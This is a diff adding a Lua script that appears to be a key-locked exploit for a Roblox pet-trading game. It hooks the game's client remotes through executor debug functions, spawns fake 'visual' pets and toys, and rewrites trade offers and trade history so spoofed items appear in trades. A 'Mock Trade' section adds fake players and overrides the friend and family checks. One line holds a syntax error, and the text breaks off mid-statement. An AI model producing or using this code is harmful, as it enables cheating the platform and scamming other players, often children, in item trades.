@@ -1,0 +1,2740 @@
+
+
+local correctKey = "Plastica123"
+
+local keyGui = Instance.new("ScreenGui")
+keyGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local keyFrame = Instance.new("Frame")
+keyFrame.Size = UDim2.new(0, 200, 0, 100)
+keyFrame.Position = UDim2.new(0.5, -100, 0.5, -50)
+keyFrame.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+keyFrame.Parent = keyGui
+
+local keyBox = Instance.new("TextBox")
+keyBox.Size = UDim2.new(1,0,0,30)
+keyBox.Position = UDim2.new(0,0,0,10)
+keyBox.BackgroundColor3 = Color3.fromRGB(255,255,255)  -- white
+keyBox.TextColor3 = Color3.fromRGB(0,0,0)
+keyBox.Parent = keyFrame
+
+local submitButton = Instance.new("TextButton")
+submitButton.Size = UDim2.new(1,0,0,30)
+submitButton.Position = UDim2.new(0,0,0,50)
+submitButton.Text = "Submit"
+submitButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
+submitButton.TextColor3 = Color3.fromRGB(173, 216, 230)
+submitButton.Parent = keyFrame
+
+submitButton.MouseButton1Click:Connect(function()
+    if keyBox.Text == correctKey then
+        keyGui:Destroy()
+        -- Rest of the script starts here
+
+-- bypassing equipping for spawner
+local originalRemotes = {}
+local routerInit = debug.getupvalue(
+    require(game.ReplicatedStorage.Fsys).load('RouterClient').init,
+    7
+)
+for i, v in pairs(routerInit) do
+    v.Name = i
+    originalRemotes[i] = v
+end
+local Fsys = require(game:GetService('ReplicatedStorage'):WaitForChild('Fsys'))
+local UIManager = Fsys.load('UIManager')
+local toys = Fsys.load('ClientData').get('inventory').toys
+local licenseUniqueId
+for i, v in pairs(toys) do
+    if v.id == 'trade_license' then
+        licenseUniqueId = i
+        break
+    end
+end
+local function hookedEquip(player, uniqueId, ...)
+    if uniqueId == licenseUniqueId then
+        UIManager.set_app_visibility('TradeHistoryApp', true)
+    end
+    return originalRemotes['ToolAPI/Equip'](player, uniqueId, ...)
+end
+local function hookedUnequip(player, uniqueId)
+    if uniqueId == licenseUniqueId then
+        UIManager.set_app_visibility('TradeHistoryApp', false)
+    end
+    return originalRemotes['ToolAPI/Unequip'](player, uniqueId)
+end
+debug.setupvalue(
+    require(game.ReplicatedStorage.Fsys).load('RouterClient').init,
+    7,
+    setmetatable({
+        ['ToolAPI/Equip'] = hookedEquip,
+        ['ToolAPI/Unequip'] = hookedUnequip,
+    }, {
+        __index = originalRemotes,
+        __newindex = function(t, k, v)
+            if k == 'ToolAPI/Equip' or k == 'ToolAPI/Unequip' then
+                rawset(t, k, v)
+            else
+                originalRemotes[k] = v
+            end
+        end,
+    })
+)
+-- hooking so trades can show visual pets
+local Players = game:GetService('Players')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local Fsys = require(ReplicatedStorage:WaitForChild('Fsys'))
+local UIManager = Fsys.load('UIManager')
+local TradeHistoryApp = UIManager.apps.TradeHistoryApp
+local TradeApp = UIManager.apps.TradeApp
+local LocalPlayer = Players.LocalPlayer
+if TradeHistoryApp._ORIGINAL_create_trade_frame then
+    TradeHistoryApp._create_trade_frame =
+        TradeHistoryApp._ORIGINAL_create_trade_frame
+end
+if TradeApp._ORIGINAL_change_local_trade_state then
+    TradeApp._change_local_trade_state =
+        TradeApp._ORIGINAL_change_local_trade_state
+end
+if TradeApp._ORIGINAL_overwrite_local_trade_state then
+    TradeApp._overwrite_local_trade_state =
+        TradeApp._ORIGINAL_overwrite_local_trade_state
+end
+TradeHistoryApp._ORIGINAL_create_trade_frame =
+    TradeHistoryApp._create_trade_frame
+TradeApp._ORIGINAL_change_local_trade_state = TradeApp._change_local_trade_state
+TradeApp._ORIGINAL_overwrite_local_trade_state =
+    TradeApp._overwrite_local_trade_state
+local tradeOffers = {}
+TradeApp._change_local_trade_state = function(self, change, ...)
+    local state = self:_get_local_trade_state()
+    if state and state.trade_id then
+        if state.sender == LocalPlayer and change.sender_offer then
+            tradeOffers[state.trade_id] = {
+                items = table.clone(change.sender_offer.items),
+                isSender = true,
+            }
+        elseif state.recipient == LocalPlayer and change.recipient_offer then
+            tradeOffers[state.trade_id] = {
+                items = table.clone(change.recipient_offer.items),
+                isSender = false,
+            }
+        end
+    end
+    return TradeApp._ORIGINAL_change_local_trade_state(self, change, ...)
+end
+TradeApp._overwrite_local_trade_state = function(self, trade, ...)
+    if not trade and TradeApp._last_trade_id then
+        tradeOffers[TradeApp._last_trade_id] = nil
+    end
+    return TradeApp._ORIGINAL_overwrite_local_trade_state(self, trade, ...)
+end
+TradeHistoryApp._create_trade_frame = function(self, tradeData, ...)
+    if tradeData.trade_id and tradeOffers[tradeData.trade_id] then
+        local offer = tradeOffers[tradeData.trade_id]
+        local modified = table.clone(tradeData)
+
+        if offer.isSender then
+            modified.sender_items = table.clone(offer.items)
+        else
+            modified.recipient_items = table.clone(offer.items)
+        end
+        return self._ORIGINAL_create_trade_frame(self, modified, ...)
+    end
+    return self._ORIGINAL_create_trade_frame(self, tradeData, ...)
+end
+-- hooking so visual pets can add to trade
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local Players = game:GetService('Players')
+local Fsys = require(ReplicatedStorage:WaitForChild('Fsys'))
+local UIManager = Fsys.load('UIManager')
+local data
+local _overwrite_local_trade_state =
+    UIManager.apps.TradeApp._overwrite_local_trade_state
+UIManager.apps.TradeApp._overwrite_local_trade_state = function(
+    self,
+    trade,
+    ...
+)
+    if trade then
+        local offer = trade.sender == Players.LocalPlayer and trade.sender_offer
+            or trade.recipient == Players.LocalPlayer
+                and trade.recipient_offer
+        if offer then
+            if data then
+                offer.items = data
+            end
+        end
+    else
+        data = nil
+    end
+    return _overwrite_local_trade_state(self, trade, ...)
+end
+local _change_local_trade_state =
+    UIManager.apps.TradeApp._change_local_trade_state
+UIManager.apps.TradeApp._change_local_trade_state = function(self, change, ...)
+    local trade = UIManager.apps.TradeApp.local_trade_state
+    if trade then
+        local team = trade.sender == Players.LocalPlayer and 'sender_offer'
+            or trade.recipient == Players.LocalPlayer and 'recipient_offer'
+        if team then
+            local offer = change[team]
+            if offer and offer.items then
+                data = offer.items
+            end
+        end
+    end
+    return _change_local_trade_state(self, change, ...)
+end
+-- spawner
+local TweenService = game:GetService('TweenService')
+local Players = game:GetService('Players')
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService('RunService')
+local activeFlags = { F = false, R = false, N = false, M = false }
+local baseColors = {
+    Color3.fromRGB(170, 0, 255), -- Mega Neon (purple)
+    Color3.fromRGB(0, 255, 100), -- Neon (green)
+    Color3.fromRGB(0, 200, 255), -- Fly (blue)
+    Color3.fromRGB(255, 50, 150), -- Ride (pink)
+}
+
+-- Pet spawning logic
+task.spawn(function()
+    local load = require(game.ReplicatedStorage:WaitForChild('Fsys')).load
+
+    set_thread_identity(2)
+    local clientData = load('ClientData')
+    local items = load('KindDB')
+    local router = load('RouterClient')
+    local downloader = load('DownloadClient')
+    local animationManager = load('AnimationManager')
+    local petRigs = load('new:PetRigs')
+    set_thread_identity(8)
+
+    local petModels = {}
+    local pets = {}
+    local equippedPet = nil
+    local mountedPet = nil
+    local currentMountTrack = nil
+
+    local function updateData(key, action)
+        local data = clientData.get(key)
+
+        local clonedData = table.clone(data)
+        clientData.predict(key, action(clonedData))
+    end
+
+    local function getUniqueId()
+        local HttpService = game:GetService('HttpService')
+        return HttpService:GenerateGUID(false)
+    end
+
+    local function getPetModel(kind)
+        if petModels[kind] then
+            return petModels[kind]
+        end
+
+        local streamed = downloader.promise_download_copy('Pets', kind):expect()
+        petModels[kind] = streamed
+        return streamed
+    end
+
+    local function createPet(id, properties)
+        local uniqueId = getUniqueId()
+        local item = items[id]
+        if not item then
+            warn('Pet ID not found: ' .. id)
+            return nil
+        end
+
+        set_thread_identity(2)
+        local new_pet = {
+            unique = uniqueId,
+            category = 'pets',
+            id = id,
+            kind = item.kind,
+            newness_order = math.random(1, 900000),
+            properties = properties or {},
+        }
+        local inventory = clientData.get('inventory')
+        inventory.pets[uniqueId] = new_pet
+
+        set_thread_identity(8)
+        pets[uniqueId] = {
+            data = new_pet,
+            model = nil,
+        }
+        return new_pet
+    end
+
+    -- Toy spawning function
+    local function createToy(id)
+        local uniqueId = getUniqueId()
+        local item = items[id]
+        if not item then
+            warn('Toy ID not found: ' .. id)
+            return nil
+        end
+
+        set_thread_identity(2)
+        local new_toy = {
+            unique = uniqueId,
+            category = 'toys',
+            id = id,
+            kind = item.kind,
+            newness_order = math.random(1, 900000),
+            properties = {},
+        }
+        local inventory = clientData.get('inventory')
+        inventory.toys[uniqueId] = new_toy
+
+        set_thread_identity(8)
+        return new_toy
+    end
+
+    local function neonify(model, entry)
+        local petModel = model:FindFirstChild('PetModel')
+
+        if not petModel then
+            return
+        end
+
+        for neonPart, configuration in pairs(entry.neon_parts) do
+            local trueNeonPart =
+                petRigs.get(petModel).get_geo_part(petModel, neonPart)
+            trueNeonPart.Material = configuration.Material
+            trueNeonPart.Color = configuration.Color
+        end
+    end
+
+    local function addPetWrapper(wrapper)
+        updateData('pet_char_wrappers', function(petWrappers)
+            wrapper.unique = #petWrappers + 1
+            wrapper.index = #petWrappers + 1
+            petWrappers[#petWrappers + 1] = wrapper
+            return petWrappers
+        end)
+    end
+
+    local function addPetState(state)
+        updateData('pet_state_managers', function(petStates)
+            petStates[#petStates + 1] = state
+            return petStates
+        end)
+    end
+
+    local function findIndex(array, finder)
+        for index, value in pairs(array) do
+            local isIt = finder(value, index)
+
+            if isIt then
+                return index
+            end
+        end
+
+        return nil
+    end
+
+    local function removePetWrapper(uniqueId)
+        updateData('pet_char_wrappers', function(petWrappers)
+            local index = findIndex(petWrappers, function(wrapper)
+                return wrapper.pet_unique == uniqueId
+            end)
+
+            if not index then
+                return petWrappers
+            end
+
+            table.remove(petWrappers, index)
+
+            for wrapperIndex, wrapper in pairs(petWrappers) do
+                wrapper.unique = wrapperIndex
+                wrapper.index = wrapperIndex
+            end
+
+            return petWrappers
+        end)
+    end
+
+    local function clearPetState(uniqueId)
+        local pet = pets[uniqueId]
+
+        if not pet then
+            return
+        end
+
+        if not pet.model then
+            return
+        end
+
+        updateData('pet_state_managers', function(states)
+            local index = findIndex(states, function(state)
+                return state.char == pet.model
+            end)
+
+            if not index then
+                return states
+            end
+
+            local clonedStates = table.clone(states)
+
+            clonedStates[index] = table.clone(clonedStates[index])
+            clonedStates[index].states = {}
+
+            return clonedStates
+        end)
+    end
+
+    local function setPetState(uniqueId, id)
+        local pet = pets[uniqueId]
+
+        if not pet then
+            return
+        end
+
+        if not pet.model then
+            return
+        end
+
+        updateData('pet_state_managers', function(states)
+            local index = findIndex(states, function(state)
+                return state.char = pet.model
+            end)
+
+            if not index then
+                return states
+            end
+
+            local clonedStates = table.clone(states)
+
+            clonedStates[index] = table.clone(clonedStates[index])
+            clonedStates[index].states = {
+                { id = id },
+            }
+
+            return clonedStates
+        end)
+    end
+
+    local function attachPlayerToPet(pet)
+        local character = game.Players.LocalPlayer.Character
+
+        if not character then
+            return false
+        end
+
+        if not character.PrimaryPart then
+            return false
+        end
+
+        local ridePosition = pet:FindFirstChild('RidePosition', true)
+
+        if not ridePosition then
+            return false
+        end
+
+        local sourceAttachment = Instance.new('Attachment')
+
+        sourceAttachment.Parent = ridePosition
+        sourceAttachment.Position = Vector3.new(0, 1.237, 0)
+        sourceAttachment.Name = 'SourceAttachment'
+
+        local stateConnection = Instance.new('RigidConstraint')
+
+        stateConnection.Name = 'StateConnection'
+        stateConnection.Attachment0 = sourceAttachment
+        stateConnection.Attachment1 = character.PrimaryPart.RootAttachment
+
+        stateConnection.Parent = character
+
+        return true
+    end
+
+    local function clearPlayerState()
+        updateData('state_manager', function(state)
+            local clonedState = table.clone(state)
+            clonedState.states = {}
+            clonedState.is_sitting = false
+            return clonedState
+        end)
+    end
+
+    local function setPlayerState(id)
+        updateData('state_manager', function(state)
+            local clonedState = table.clone(state)
+
+            clonedState.states = {
+                { id = id },
+            }
+
+            clonedState.is_sitting = true
+
+            return clonedState
+        end)
+    end
+
+    local function removePetState(uniqueId)
+        local pet = pets[uniqueId]
+
+        if not pet then
+            return
+        end
+
+        if not pet.model then
+            return
+        end
+
+        updateData('pet_state_managers', function(petStates)
+            local index = findIndex(petStates, function(state)
+                return state.char == pet.model
+            end)
+
+            if not index then
+                return petStates
+            end
+
+            table.remove(petStates, index)
+            return petStates
+        end)
+    end
+
+    local function unmount(uniqueId)
+        local pet = pets[uniqueId]
+
+        if not pet then
+            return
+        end
+
+        if not pet.model then
+            return
+        end
+
+        if currentMountTrack then
+            currentMountTrack:Stop()
+            currentMountTrack:Destroy()
+        end
+
+        local sourceAttachment =
+            pet.model:FindFirstChild('SourceAttachment', true)
+
+        if sourceAttachment then
+            sourceAttachment:Destroy()
+        end
+
+        if game.Players.LocalPlayer.Character then
+            for _, descendant in
+                pairs(game.Players.LocalPlayer.Character:GetDescendants())
+            do
+                if
+                    descendant:IsA('BasePart')
+                    and descendant:GetAttribute('HaveMass')
+                then
+                    descendant.Massless = false
+                end
+            end
+        end
+
+        clearPetState(uniqueId)
+        clearPlayerState()
+
+        pet.model:ScaleTo(1)
+
+        mountedPet = nil
+    end
+
+    local function mount(uniqueId, playerState, petState)
+        local pet = pets[uniqueId]
+
+        if not pet then
+            return
+        end
+
+        if not pet.model then
+            return
+        end
+
+        local player = game.Players.LocalPlayer
+
+        if not player.Character then
+            return
+        end
+
+        if not player.Character.PrimaryPart then
+            return
+        end
+
+        mountedPet = uniqueId
+
+        setPetState(uniqueId, petState)
+        setPlayerState(playerState)
+
+        pet.model:ScaleTo(2)
+        attachPlayerToPet(pet.model)
+
+        currentMountTrack = player.Character.Humanoid.Animator:LoadAnimation(
+            animationManager.get_track('PlayerRidingPet')
+        )
+        player.Character.Humanoid.Sit = true
+
+        for _, descendant in pairs(player.Character:GetDescendants()) do
+            if descendant:IsA('BasePart') and descendant.Massless == false then
+                descendant.Massless = true
+                descendant:SetAttribute('HaveMass', true)
+            end
+        end
+
+        currentMountTrack:Play()
+    end
+
+    local function fly(uniqueId)
+        mount(uniqueId, 'PlayerFlyingPet', 'PetBeingFlown')
+    end
+
+    local function ride(uniqueId)
+        mount(uniqueId, 'PlayerRidingPet', 'PetBeingRidden')
+    end
+
+    local function unequip(item)
+        local pet = pets[item.unique]
+
+        if not pet then
+            return
+        end
+
+        if not pet.model then
+            return
+        end
+
+        unmount(item.unique)
+
+        removePetWrapper(item.unique)
+        removePetState(item.unique)
+
+        pet.model:Destroy()
+        pet.model = nil
+
+        equippedPet = nil
+    end
+
+    local function equip(item)
+        -- Only handle pets through this custom system
+        if item.category == 'pets' then
+            if equippedPet then
+                unequip(equippedPet)
+            end
+
+            local petModel = getPetModel(item.kind):Clone()
+            petModel.Parent = workspace
+            pets[item.unique].model = petModel
+
+            if item.properties.neon or item.properties.mega_neon then
+                neonify(petModel, items[item.kind])
+            end
+
+            equippedPet = item
+
+            addPetWrapper({
+                char = petModel,
+                mega_neon = item.properties.mega_neon,
+                neon = item.properties.neon,
+                player = game.Players.LocalPlayer,
+                entity_controller = game.Players.LocalPlayer,
+                controller = game.Players.LocalPlayer,
+                rp_name = item.properties.rp_name or '',
+                pet_trick_level = item.properties.pet_trick_level,
+                pet_unique = item.unique,
+                pet_id = item.id,
+                location = {
+                    full_destination_id = 'housing',
+                    destination_id = 'housing',
+                    house_owner = game.Players.LocalPlayer,
+                },
+                pet_progression = {
+                    age = math.random(1, 900000),
+                    percentage = math.random(0.01, 0.99),
+                },
+                are_colors_sealed = false,
+                is_pet = true,
+            })
+
+            addPetState({
+                char = petModel,
+                player = game.Players.LocalPlayer,
+                store_key = 'pet_state_managers',
+                is_sitting = false,
+                chars_connected_to_me = {},
+                states = {},
+            })
+        else
+            -- For non-pet items, just call the original equip function
+            return oldGet('ToolAPI/Equip'):InvokeServer(item.unique)
+        end
+    end
+
+    local oldGet = router.get
+
+    local function createRemoteFunctionMock(callback)
+        return {
+            InvokeServer = function(_, ...)
+                return callback(...)
+            end,
+        }
+    end
+
+    local function createRemoteEventMock(callback)
+        return {
+            FireServer = function(_, ...)
+                return callback(...)
+            end,
+        }
+    end
+
+    -- Only intercept pet equips
+    local equipRemote = createRemoteFunctionMock(function(uniqueId, metadata)
+        local pet = pets[uniqueId]
+
+        if pet then
+            equip(pet.data)
+            return true,
+                {
+                    action = 'equip',
+                    is_server = true,
+                }
+        end
+
+        -- Forward non-pet equips to original handler
+        return oldGet('ToolAPI/Equip'):InvokeServer(uniqueId, metadata)
+    end)
+
+    -- Only intercept pet unequips
+    local unequipRemote = createRemoteFunctionMock(function(uniqueId)
+        local pet = pets[uniqueId]
+
+        if pet then
+            unequip(pet.data)
+            return true,
+                {
+                    action = 'unequip',
+                    is_server = true,
+                }
+        end
+
+        -- Forward non-pet unequips to original handler
+        return oldGet('ToolAPI/Unequip'):InvokeServer(uniqueId)
+    end)
+
+    -- Pet-specific remotes remain unchanged
+    local rideRemote = createRemoteFunctionMock(function(item)
+        ride(item.pet_unique)
+    end)
+
+    local flyRemote = createRemoteFunctionMock(function(item)
+        fly(item.pet_unique)
+    end)
+
+    local unmountRemoteFunction = createRemoteFunctionMock(function()
+        unmount(mountedPet)
+    end)
+
+    local unmountRemoteEvent = createRemoteEventMock(function()
+        unmount(mountedPet)
+    end)
+
+    router.get = function(name)
+        -- Only intercept pet-related calls
+        if name == 'ToolAPI/Equip' then
+            return equipRemote
+        elseif name == 'ToolAPI/Unequip' then
+            return unequipRemote
+        elseif name == 'AdoptAPI/RidePet' then
+            return rideRemote
+        elseif name == 'AdoptAPI/FlyPet' then
+            return flyRemote
+        elseif name == 'AdoptAPI/ExitSeatStatesYield' then
+            return unmountRemoteFunction
+        elseif name == 'AdoptAPI/ExitSeatStates' then
+            return unmountRemoteEvent
+        end
+
+        -- Pass through all other requests
+        return oldGet(name)
+    end
+
+    -- Only unequip pets on startup
+    for _, charWrapper in pairs(clientData.get('pet_char_wrappers')) do
+        oldGet('ToolAPI/Unequip'):InvokeServer(charWrapper.pet_unique)
+    end
+
+    local Loads = require(game.ReplicatedStorage.Fsys).load
+    local InventoryDB = Loads('InventoryDB')
+
+    function GetPetByName(name)
+        for i, v in pairs(InventoryDB.pets) do
+            if v.name:lower() == name:lower() then
+                return v.id
+            end
+        end
+        return false
+    end
+
+    function GetToyByName(name)
+        for i, v in pairs(InventoryDB.toys) do
+            if v.name:lower() == name:lower() then
+                return v.id
+            end
+        end
+        return false
+    end
+
+    -- UI Setup
+    local screenGui = Instance.new('ScreenGui')
+    screenGui.Name = 'SkaiAdmSpawner'
+    screenGui.Parent = LocalPlayer:WaitForChild('PlayerGui')
+
+    -- Main frame (with colored stroke)
+    local mainFrame = Instance.new('Frame')
+    mainFrame.Size = UDim2.new(0, 320, 0, 300) -- Increased height to accommodate toy spawner
+    mainFrame.Position = UDim2.new(0.5, -160, 0.4, -150) -- Adjusted position
+    mainFrame.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+    mainFrame.BackgroundTransparency = 1
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 1 -- Renders on top of blackFrame
+    mainFrame.Parent = screenGui
+
+    -- Rounded corners for main frame
+    local uiCorner = Instance.new('UICorner')
+    uiCorner.CornerRadius = UDim.new(0, 10)
+    uiCorner.Parent = mainFrame
+
+    -- Colored animated stroke (inner border)
+    local uiStroke = Instance.new('UIStroke')
+    uiStroke.Color = Color3.fromRGB(255,255,255) -- white
+    uiStroke.Thickness = 3
+    uiStroke.Transparency = 0
+    uiStroke.Parent = mainFrame
+
+    -- Black background frame (fake outer stroke)
+    local blackFrame = Instance.new('Frame')
+    blackFrame.Size = UDim2.new(0, 330, 0, 310) -- Adjusted size to match new mainFrame
+    blackFrame.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+    blackFrame.BackgroundTransparency = 0
+    blackFrame.BorderSizePixel = 0
+    blackFrame.ZIndex = 0 -- Renders behind mainFrame
+    blackFrame.Parent = screenGui
+
+    -- Rounded corners for black frame (radius = 14)
+    local blackCorner = Instance.new('UICorner')
+    blackCorner.CornerRadius = UDim.new(0, 15.5)
+    blackCorner.Parent = blackFrame
+
+    -- Make blackFrame follow mainFrame's position dynamically
+    mainFrame:GetPropertyChangedSignal('Position'):Connect(function()
+        blackFrame.Position = UDim2.new(
+            mainFrame.Position.X.Scale,
+            mainFrame.Position.X.Offset - 5, -- Adjust for size difference
+            mainFrame.Position.Y.Scale,
+            mainFrame.Position.Y.Offset - 5
+        )
+    end)
+
+    -- Initialize position
+    blackFrame.Position = UDim2.new(
+        mainFrame.Position.X.Scale,
+        mainFrame.Position.X.Offset - 5,
+        mainFrame.Position.Y.Scale,
+        mainFrame.Position.Y.Offset - 5
+    )
+
+    -- Adjusted color palette (less rainbow, more cohesive)
+    local colorPalette = {
+        Color3.fromRGB(255,255,255), -- white
+        Color3.fromRGB(173, 216, 230), -- bleu clair
+    }
+
+    -- Animation parameters
+    local TRANSITION_TIME = 4 -- Slower transitions (seconds)
+    local currentIndex = 1
+
+    -- Smooth color transition function
+    local function animateToNextColor()
+        local nextIndex = currentIndex % #colorPalette + 1
+
+        TweenService:Create(
+            uiStroke,
+            TweenInfo.new(
+                TRANSITION_TIME,
+                Enum.EasingStyle.Linear,
+                Enum.EasingDirection.Out
+            ),
+            {
+                Color = colorPalette[nextIndex],
+            }
+        ):Play()
+
+        currentIndex = nextIndex
+        wait(TRANSITION_TIME)
+        animateToNextColor()
+    end
+
+    -- Start the animation
+    coroutine.wrap(animateToNextColor)()
+
+    local titleLabel = Instance.new('TextLabel')
+    titleLabel.Size = UDim2.new(1, 0, 0, 25)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = 'by plastica'
+    titleLabel.Font = Enum.Font.FredokaOne
+    titleLabel.TextSize = 20
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- white
+    titleLabel.Parent = mainFrame
+
+    -- Tab buttons
+    local tabFrame = Instance.new('Frame')
+    tabFrame.Size = UDim2.new(1, 0, 0, 30)
+    tabFrame.BackgroundTransparency = 1
+    tabFrame.Parent = mainFrame
+
+    local petTab = Instance.new('TextButton')
+    petTab.Size = UDim2.new(0.33, 0, 1, 0)
+    petTab.Position = UDim2.new(0, 0, 0, 0)
+    petTab.Text = 'Pets'
+    petTab.BackgroundColor3 = Color3.fromRGB(255,255,255)  -- white
+    petTab.BackgroundTransparency = 0.1
+    petTab.Font = Enum.Font.FredokaOne
+    petTab.TextColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+    petTab.TextSize = 16
+    petTab.Parent = tabFrame
+
+    local toyTab = Instance.new('TextButton')
+    toyTab.Size = UDim2.new(0.33, 0, 1, 0)
+    toyTab.Position = UDim2.new(0.33, 0, 0, 0)
+    toyTab.Text = 'Toys'
+    toyTab.BackgroundColor3 = Color3.fromRGB(255,255,255)  -- white
+    toyTab.BackgroundTransparency = 0.1
+    toyTab.Font = Enum.Font.FredokaOne
+    toyTab.TextColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+    toyTab.TextSize = 16
+    toyTab.Parent = tabFrame
+
+    local mockTab = Instance.new('TextButton')
+    mockTab.Size = UDim2.new(0.33, 0, 1, 0)
+    mockTab.Position = UDim2.new(0.66, 0, 0, 0)
+    mockTab.Text = 'Mock Trade'
+    mockTab.BackgroundColor3 = Color3.fromRGB(255,255,255)  -- white
+    mockTab.BackgroundTransparency = 0.1
+    mockTab.Font = Enum.Font.FredokaOne
+    mockTab.TextColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+    mockTab.TextSize = 16
+    mockTab.Parent = tabFrame
+
+    local petContent = Instance.new('Frame')
+    petContent.Size = UDim2.new(1, 0, 1, -60)
+    petContent.Position = UDim2.new(0, 0, 0, 60)
+    petContent.BackgroundTransparency = 1
+    petContent.Visible = true
+    petContent.Parent = mainFrame
+
+    local toyContent = Instance.new('Frame')
+    toyContent.Size = UDim2.new(1, 0, 1, -60)
+    toyContent.Position = UDim2.new(0, 0, 0, 60)
+    toyContent.BackgroundTransparency = 1
+    toyContent.Visible = false
+    toyContent.Parent = mainFrame
+
+    local mockContent = Instance.new('Frame')
+    mockContent.Size = UDim2.new(1, 0, 1, -60)
+    mockContent.Position = UDim2.new(0, 0, 0, 60)
+    mockContent.BackgroundTransparency = 1
+    mockContent.Visible = false
+    mockContent.Parent = mainFrame
+
+    -- Tab switching
+    petTab.MouseButton1Click:Connect(function()
+        petContent.Visible = true
+        toyContent.Visible = false
+        mockContent.Visible = false
+    end)
+
+    toyTab.MouseButton1Click:Connect(function()
+        petContent.Visible = false
+        toyContent.Visible = true
+        mockContent.Visible = false
+    end)
+
+    mockTab.MouseButton1Click:Connect(function()
+        petContent.Visible = false
+        toyContent.Visible = false
+        mockContent.Visible = true
+    end)
+
+    -- Mock Trade button in mockContent
+    local executeMock = Instance.new('TextButton')
+    executeMock.Size = UDim2.new(0.6, 0, 0, 25)
+    executeMock.Position = UDim2.new(0.2, 0, 0.4, 0)
+    executeMock.Text = 'Execute Mock Trade'
+    executeMock.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    executeMock.TextColor3 = Color3.fromRGB(173, 216, 230)
+    executeMock.Parent = mockContent
+
+    executeMock.MouseButton1Click:Connect(function()
+        -- The content of 87NYGzDB.txt
+        local Players = game:GetService('Players')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local RunService = game:GetService('RunService')
+local UserInputService = game:GetService('UserInputService')
+local TweenService = game:GetService('TweenService')
+local HttpService = game:GetService('HttpService')
+local Chat = game:GetService('Chat')
+
+pcall(function()
+   setthreadidentity(2)
+end)
+
+-- COMPREHENSIVE HOOKS FOR FAKE PLAYERS - MUST BE FIRST
+local fakePlayerIds = {}
+_G.fakePlayerIds = fakePlayerIds
+
+-- Hook SettingsHelper early with better fake player detection
+task.spawn(function()
+   task.wait(0.1) -- Small delay to ensure modules are loaded
+   local SettingsHelper =
+       require(ReplicatedStorage:WaitForChild('Fsys')).load('SettingsHelper')
+   local original_get_setting_server = SettingsHelper.get_setting_server
+
+   SettingsHelper.get_setting_server = function(player, settingName, ...)
+       -- Multiple checks to identify fake players
+       if player and player.UserId then
+           -- Check 1: Direct ID match
+           if fakePlayerIds[player.UserId] then
+               return false
+           end
+
+           -- Check 2: Player not in Players service
+           if not Players:GetPlayerByUserId(player.UserId) then
+               return false
+           end
+       end
+
+       -- Only call original for real players
+       local args = { ... }
+       local success, result = pcall(function()
+           return original_get_setting_server(
+               player,
+               settingName,
+               table.unpack(args)
+           )
+       end)
+
+       if success then
+           return result
+       else
+           -- If error happens, assume it's a fake player and return safe default
+           return false
+       end
+   end
+end)
+
+-- Hook FamilyHelper early
+task.spawn(function()
+   task.wait(0.1) -- Small delay to ensure modules are loaded
+   local FamilyHelper =
+       require(ReplicatedStorage:WaitForChild('Fsys')).load('FamilyHelper')
+
+   local original_are_friends_family = FamilyHelper.are_friends_family
+   local original_is_my_friend_or_family = FamilyHelper.is_my_friend_or_family
+   local original_are_family_because_friends =
+       FamilyHelper.are_family_because_friends
+   local original_is_my_family_because_friend =
+       FamilyHelper.is_my_family_because_friend
+
+   FamilyHelper.are_friends_family = function(player1, player2)
+       if
+           player1
+           and player2
+           and (fakePlayerIds[player1.UserId] or fakePlayerIds[player2.UserId])
+       then
+           return false
+       end
+       return original_are_friends_family(player1, player2)
+   end
+
+   FamilyHelper.is_my_friend_or_family = function(player)
+       if player and fakePlayerIds[player.UserId] then
+           return false
+       end
+       return original_is_my_friend_or_family(player)
+   end
+
+   FamilyHelper.are_family_because_friends = function(player1, player2)
+       if
+           player1
+           and player2
+           and (fakePlayerIds[player1.UserId] or fakePlayerIds[player2.UserId])
+       then
+           return false
+       end
+       return original_are_family_because_friends(player1, player2)
+   end
+
+   FamilyHelper.is_my_family_because_friend = function(player)
+       if player and fakePlayerIds[player.UserId] then
+           return false
+       end
+       return original_is_my_family_because_friend(player)
+   end
+end)
+
+local Fsys = require(ReplicatedStorage:WaitForChild('Fsys'))
+local load = Fsys.load
+local UIManager = load('UIManager')
+local ClientData = load('ClientData')
+local TableUtil = load('TableUtil')
+local RouterClient = load('RouterClient')
+local InventoryDB = load('InventoryDB')
+local animationManager = load('AnimationManager')
+local ColorThemeManager = load('ColorThemeManager')
+
+if UIManager.wait_for_initialization then
+   UIManager:wait_for_initialization()
+else
+   task.wait(2)
+end
+
+local TradeApp = UIManager.apps.TradeApp
+local BackpackApp = UIManager.apps.BackpackApp
+local DialogApp = UIManager.apps.DialogApp
+local HintApp = UIManager.apps.HintApp
+local SettingsApp = UIManager.apps.SettingsApp
+local PlayerProfileApp = UIManager.apps.PlayerProfileApp
+local TradeHistoryApp = UIManager.apps.TradeHistoryApp
+local TradePreviewApp = UIManager.apps.TradePreviewApp
+
+local NegotiationFrame =
+   Players.LocalPlayer.PlayerGui.TradeApp.Frame.NegotiationFrame
+local function FriendHighlight(FriendValue)
+   NegotiationFrame.FriendHighlight.Visible = FriendValue
+   NegotiationFrame.FriendBorder.Visible = FriendValue
+   local PartnerFrame = NegotiationFrame.Header.PartnerFrame
+   NegotiationFrame.Header.PartnerFrame.NameLabel.FriendLabel.Visible =
+       FriendValue
+   local ColorThemeManagerColor =
+       ColorThemeManager.lookup(FriendValue and 'background' or 'saturated')
+   NegotiationFrame.Header.PartnerFrame.ProfileIcon.ImageColor3 =
+       ColorThemeManagerColor
+   NegotiationFrame.Header.PartnerFrame.NameLabel.TextColor3 =
+       ColorThemeManagerColor
+   NegotiationFrame.Header.PartnerFrame.Icon.Visible = FriendValue
+   NegotiationFrame.Header.PartnerFrame.Icon.Image =
